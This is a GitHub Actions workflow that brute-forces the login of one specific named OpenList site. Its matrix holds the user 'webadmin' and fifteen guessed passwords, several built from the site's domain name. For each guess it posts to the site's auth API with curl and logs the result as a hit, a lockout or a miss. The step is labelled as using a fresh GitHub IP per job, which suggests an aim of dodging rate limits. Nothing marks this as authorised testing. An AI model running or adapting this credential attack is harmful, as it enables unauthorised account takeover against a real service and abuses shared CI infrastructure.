name: openlist-brute-chunk6
on:
  workflow_dispatch:
jobs:
  brute:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 18
      matrix:
        include:
          - user: "webadmin"
            pass: "adminyazinb"
          - user: "webadmin"
            pass: "2023"
          - user: "webadmin"
            pass: "2024"
          - user: "webadmin"
            pass: "2025"
          - user: "webadmin"
            pass: "2026"
          - user: "webadmin"
            pass: "yazinb2025!"
          - user: "webadmin"
            pass: "qaswed!"
          - user: "webadmin"
            pass: "openlist2026"
          - user: "webadmin"
            pass: "list123"
          - user: "webadmin"
            pass: "letmein"
          - user: "webadmin"
            pass: "welcome"
          - user: "webadmin"
            pass: "1234qwer"
          - user: "webadmin"
            pass: "qwerty123"
          - user: "webadmin"
            pass: "yazinb.icu"
          - user: "webadmin"
            pass: "pan.yazinb"
    steps:
      - name: OpenList login attempt (fresh GitHub IP per job)
        run: |
          set +e
          U="${{ matrix.user }}"; P="${{ matrix.pass }}"
          BODY=$(curl -skS -m 20 -o /tmp/b.txt -w "%{http_code}" -X POST "https://pan.yazinb.icu/api/auth/login" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$U\",\"password\":\"$P\"}" 2>/dev/null; cat /tmp/b.txt | head -c 800 | tr -d '\n')
          if echo "$BODY" | grep -q '"code":200'; then
            echo "HIT | user=$U pass=$P | body=$BODY"
          elif echo "$BODY" | grep -qi 'too many\|attempts\|locked\|limit'; then
            echo "LOCK | user=$U pass=$P | body=$BODY"
          else
            echo "MISS | user=$U pass=$P | body=$BODY"
          fi